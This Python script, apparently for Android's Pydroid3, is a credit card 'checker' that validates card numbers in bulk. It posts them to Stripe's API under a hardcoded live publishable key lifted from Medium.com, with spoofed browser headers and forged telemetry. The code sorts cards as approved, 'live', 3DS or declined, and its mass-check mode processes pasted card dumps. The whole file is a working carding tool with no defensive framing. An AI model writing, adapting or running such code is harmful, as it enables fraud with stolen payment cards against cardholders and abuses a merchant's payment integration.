"""
Medium Stripe Payment Checker for Pydroid3
==========================================
A standalone credit card checker using Medium.com's Stripe integration.

Usage:
    1. Single card: Enter card in format cc|mm|yy|cvv
    2. Mass check: Enter multiple cards, one per line
    
Compatible with Pydroid3 on Android devices.
"""

import requests
import uuid
import random
import string
import time
import re


class MediumChecker:
    """Medium.com Stripe Payment Checker"""
    
    def __init__(self):
        self.pk_key = "pk_live_7FReX44VnNIInZwrIIx6ghjl"
        self.stripe_version = "2025-03-31.basil"
        self.session = requests.Session()
        self._setup_session()
    
    def _setup_session(self):
        """Setup session with default headers"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept-Language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        })
    
    def _generate_guid(self):
        """Generate random GUID for Stripe"""
        return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    def _generate_muid(self):
        """Generate random MUID for Stripe"""
        return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    def _generate_sid(self):
        """Generate random SID for Stripe"""
        return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    def _generate_client_session_id(self):
        """Generate client session ID"""
        return str(uuid.uuid4())
    
    def create_payment_method(self, cc, mm, yy, cvv):
        """
        Create Stripe payment method from card details
        
        Args:
            cc: Card number (15-16 digits)
            mm: Expiry month (2 digits)
            yy: Expiry year (2 or 4 digits)
            cvv: CVV/CVC (3-4 digits)
        
        Returns:
            dict: Payment method ID and status or error message
        """
        # Normalize year to 2 digits
        if len(str(yy)) == 4:
            yy = str(yy)[2:]
        
        url = "https://api.stripe.com/v1/payment_methods"
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
        }
        
        guid = self._generate_guid()
        muid = self._generate_muid()
        sid = self._generate_sid()
        client_session_id = self._generate_client_session_id()
        time_on_page = random.randint(20000, 60000)
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
            'referrer': 'https://medium.com',
            'time_on_page': str(time_on_page),
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': self.pk_key,
            '_stripe_version': self.stripe_version,
        }
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            
            if 'id' in result:
                return {
                    'success': True,
                    'pm_id': result['id'],
                    'brand': result.get('card', {}).get('brand', 'unknown'),
                    'last4': result.get('card', {}).get('last4', cc[-4:]),
                    'exp_month': result.get('card', {}).get('exp_month'),
                    'exp_year': result.get('card', {}).get('exp_year'),
                }
            elif 'error' in result:
                error = result['error']
                return {
                    'success': False,
                    'error_code': error.get('code', 'unknown'),
                    'error_message': error.get('message', 'Unknown error'),
                    'decline_code': error.get('decline_code', ''),
                }
            else:
                return {
                    'success': False,
                    'error_code': 'unknown',
                    'error_message': 'Unknown response format',
                }
                
        except requests.exceptions.Timeout:
            return {
                'success': False,
                'error_code': 'timeout',
                'error_message': 'Request timed out',
            }
        except requests.exceptions.RequestException as e:
            return {
                'success': False,
                'error_code': 'connection_error',
                'error_message': str(e),
            }
        except Exception as e:
            return {
                'success': False,
                'error_code': 'exception',
                'error_message': str(e),
            }
    
    def confirm_payment_intent(self, pm_id, pi_id, pi_secret):
        """
        Confirm payment intent with the created payment method
        
        Args:
            pm_id: Payment method ID (pm_xxx)
            pi_id: Payment intent ID (pi_xxx)
            pi_secret: Payment intent client secret
        
        Returns:
            dict: Confirmation result
        """
        url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
        }
        
        client_session_id = self._generate_client_session_id()
        
        data = {
            'return_url': 'https://medium.com/welcome-member',
            'payment_method': pm_id,
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': self.pk_key,
            '_stripe_version': self.stripe_version,
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'l1',
            'client_secret': f"{pi_id}_secret_{pi_secret}",
        }
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            result = response.json()
            
            if 'error' in result:
                error = result['error']
                return {
                    'success': False,
                    'status': 'declined',
                    'error_code': error.get('code', 'unknown'),
                    'error_message': error.get('message', 'Unknown error'),
                    'decline_code': error.get('decline_code', ''),
                }
            elif 'status' in result:
                return {
                    'success': True,
                    'status': result['status'],
                    'next_action': result.get('next_action'),
                }
            else:
                return {
                    'success': False,
                    'status': 'unknown',
                    'error_message': 'Unknown response',
                }
                
        except Exception as e:
            return {
                'success': False,
                'status': 'error',
                'error_message': str(e),
            }
    
    def check_card(self, card_string):
        """
        Check a card by creating a payment method
        
        Args:
            card_string: Card in format cc|mm|yy|cvv
        
        Returns:
            dict: Check result with status and message
        """
        start_time = time.time()
        
        # Parse card string
        parts = card_string.strip().replace(' ', '').split('|')
        if len(parts) != 4:
            return {
                'card': card_string,
                'status': 'INVALID',
                'message': 'Invalid card format. Use: cc|mm|yy|cvv',
                'time': 0,
            }
        
        cc, mm, yy, cvv = parts
        
        # Validate card number (basic validation)
        cc = re.sub(r'\D', '', cc)
        if len(cc) < 13 or len(cc) > 19:
            return {
                'card': card_string,
                'status': 'INVALID',
                'message': 'Invalid card number length',
                'time': 0,
            }
        
        # Normalize month
        mm = mm.zfill(2)
        
        # Normalize year
        if len(yy) == 4:
            yy = yy[2:]
        yy = yy.zfill(2)
        
        # Create payment method
        pm_result = self.create_payment_method(cc, mm, yy, cvv)
        elapsed = round(time.time() - start_time, 2)
        
        if pm_result['success']:
            return {
                'card': f"{cc}|{mm}|{yy}|{cvv}",
                'status': 'APPROVED',
                'message': 'Payment method created successfully',
                'pm_id': pm_result['pm_id'],
                'brand': pm_result['brand'],
                'last4': pm_result['last4'],
                'time': elapsed,
            }
        else:
            error_code = pm_result.get('error_code', 'unknown')
            error_msg = pm_result.get('error_message', 'Unknown error')
            decline_code = pm_result.get('decline_code', '')
            
            # Determine status based on error
            status = self._determine_status(error_code, decline_code, error_msg)
            
            return {
                'card': f"{cc}|{mm}|{yy}|{cvv}",
                'status': status,
                'message': decline_code if decline_code else error_msg,
                'error_code': error_code,
                'time': elapsed,
            }
    
    def _determine_status(self, error_code, decline_code, error_msg):
        """Determine card status based on error response"""
        
        # Live/Approved responses (card is valid, just declined for specific reason)
        live_codes = [
            'insufficient_funds',
            'incorrect_cvc',
            'invalid_cvc',
            'incorrect_zip',
            'incorrect_address',
            'card_velocity_exceeded',
            'withdrawal_count_limit_exceeded',
            'do_not_honor',
            'transaction_not_allowed',
            'pickup_card',
            'restricted_card',
            'security_violation',
            'service_not_allowed',
            'stop_payment_order',
            'revocation_of_authorization',
            'revocation_of_all_authorizations',
        ]
        
        # 3D Secure required
        three_d_codes = [
            'card_not_supported',
            'authentication_required',
        ]
        
        # Dead/Invalid cards
        dead_codes = [
            'card_declined',
            'generic_decline',
            'lost_card',
            'stolen_card',
            'expired_card',
            'invalid_expiry_month',
            'invalid_expiry_year',
            'invalid_number',
            'incorrect_number',
            'processing_error',
            'fraudulent',
        ]
        
        decline_lower = decline_code.lower() if decline_code else ''
        error_lower = error_code.lower() if error_code else ''
        msg_lower = error_msg.lower() if error_msg else ''
        
        # Check for live codes
        for code in live_codes:
            if code in decline_lower or code in error_lower or code in msg_lower:
                return 'CCN (LIVE)'
        
        # Check for 3DS
        for code in three_d_codes:
            if code in decline_lower or code in error_lower or code in msg_lower:
                return '3DS_REQUIRED'
        
        # Check for dead codes
        for code in dead_codes:
            if code in decline_lower or code in error_lower or code in msg_lower:
                return 'DECLINED'
        
        # Default
        if 'decline' in msg_lower or decline_code:
            return 'DECLINED'
        
        return 'UNKNOWN'


def parse_cards(text):
    """Extract cards from text"""
    pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    return ['|'.join(m) for m in matches]


def format_result(result):
    """Format check result for display"""
    status = result['status']
    
    # Status emoji mapping
    status_emoji = {
        'APPROVED': 'APPROVED',
        'CCN (LIVE)': 'CCN (LIVE)',
        '3DS_REQUIRED': '3DS_REQUIRED',
        'DECLINED': 'DECLINED',
        'INVALID': 'INVALID',
        'UNKNOWN': 'UNKNOWN',
    }
    
    status_display = status_emoji.get(status, status)
    
    output = f"""
{'='*45}
Card: {result['card']}
Status: {status_display}
Response: {result['message']}
Time: {result['time']}s
{'='*45}
"""
    return output


def main():
    """Main function for Pydroid3"""
    print("""
╔═══════════════════════════════════════════╗
║   MEDIUM STRIPE CHECKER - PYDROID3        ║
║   Gateway: Stripe Auth (Medium.com)       ║
╚═══════════════════════════════════════════╝
    """)
    
    checker = MediumChecker()
    
    while True:
        print("\n[1] Single Card Check")
        print("[2] Mass Check (paste multiple cards)")
        print("[3] Exit")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == '1':
            print("\nEnter card (format: cc|mm|yy|cvv)")
            card = input("Card: ").strip()
            
            if not card:
                print("No card entered!")
                continue
            
            print("\nChecking card...")
            result = checker.check_card(card)
            print(format_result(result))
            
        elif choice == '2':
            print("\nPaste cards (one per line, format: cc|mm|yy|cvv)")
            print("Enter 'done' when finished:\n")
            
            cards_text = []
            while True:
                line = input()
                if line.lower() == 'done':
                    break
                cards_text.append(line)
            
            cards = parse_cards('\n'.join(cards_text))
            
            if not cards:
                print("No valid cards found!")
                continue
            
            print(f"\nFound {len(cards)} cards. Starting check...\n")
            
            results = {
                'approved': [],
                'ccn': [],
                '3ds': [],
                'declined': [],
                'unknown': [],
            }
            
            for i, card in enumerate(cards, 1):
                print(f"[{i}/{len(cards)}] Checking {card[:6]}...{card[-4:]}")
                result = checker.check_card(card)
                
                status = result['status']
                if status == 'APPROVED':
                    results['approved'].append(result)
                    print(f"  -> APPROVED")
                elif 'LIVE' in status or 'CCN' in status:
                    results['ccn'].append(result)
                    print(f"  -> CCN (LIVE)")
                elif '3DS' in status:
                    results['3ds'].append(result)
                    print(f"  -> 3DS_REQUIRED")
                elif status == 'DECLINED':
                    results['declined'].append(result)
                    print(f"  -> DECLINED")
                else:
                    results['unknown'].append(result)
                    print(f"  -> {status}")
                
                # Small delay between checks
                if i < len(cards):
                    time.sleep(1)
            
            # Summary
            print(f"""
{'='*45}
           RESULTS SUMMARY
{'='*45}
Total Cards: {len(cards)}
Approved: {len(results['approved'])}
CCN (Live): {len(results['ccn'])}
3DS Required: {len(results['3ds'])}
Declined: {len(results['declined'])}
Unknown: {len(results['unknown'])}
{'='*45}
""")
            
            # Show approved/live cards
            if results['approved']:
                print("\n[APPROVED CARDS]")
                for r in results['approved']:
                    print(f"  {r['card']} -> {r['message']}")
            
            if results['ccn']:
                print("\n[CCN/LIVE CARDS]")
                for r in results['ccn']:
                    print(f"  {r['card']} -> {r['message']}")
            
            if results['3ds']:
                print("\n[3DS REQUIRED CARDS]")
                for r in results['3ds']:
                    print(f"  {r['card']} -> {r['message']}")
            
        elif choice == '3':
            print("\nGoodbye!")
            break
        
        else:
            print("Invalid option!")


if __name__ == "__main__":
    main()
